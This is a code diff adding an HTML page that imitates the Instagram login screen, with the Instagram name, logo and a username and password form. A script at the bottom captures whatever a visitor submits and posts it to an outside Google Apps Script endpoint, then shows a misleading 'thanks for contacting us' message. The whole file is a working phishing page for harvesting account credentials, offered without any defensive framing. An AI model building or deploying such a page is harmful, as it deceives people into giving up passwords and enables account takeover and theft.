@@ -1,0 +1,61 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <title>Instagram</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-1ycn6IcaQQ40/MKBW2W4Rhis/DbILU74C1vSrLJxCq57o941Ym01SwNsOMqvEBFlcgUa6xLiPY/NS5R+E6ztJQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" type="text/css" href="INSTAGRAM.CSS">
+    </head>
+<body>
+    
+    
+    <div class="container">
+    <div class="text"></div>
+    <div class="page">
+        <div class="title"> <img src="Bandicam/images/instagram-new-logo.png" height="100px" width="220px">            </div>
+        <form name="google-sheet">
+        <input type="text" name="username" placeholder="Phone number,usrname or email address">
+        <input type="password" name="password"  placeholder="Password">
+            <button>Log In</button>
+        <div class="option">OR</div>
+        
+        
+        <div class="fblink">
+            <i class="fab fa-facebook"></i>
+        <a href="#">Log in with Facebook</a>
+        </div>
+        
+        <div class="forget-id">
+        <a href="#">Forgetten your password? </a>
+        </div>
+        
+    
+        </form>
+        <div class="signup">
+        <P>Don't have an account? <a href="#">Sign up</a>          </P>
+        </div>
+        
+        
+        </div>    
+    </div>
+    <script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbzymNP0n5Csc2giVaUcaou_1jZcDIybL97wZNjPJX_yBGgm60i3KxfrmbsEVTwO7iyvpA/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
+
+    
+    
+    
+    
+    
+    
+    </body>
+
+
+</html>
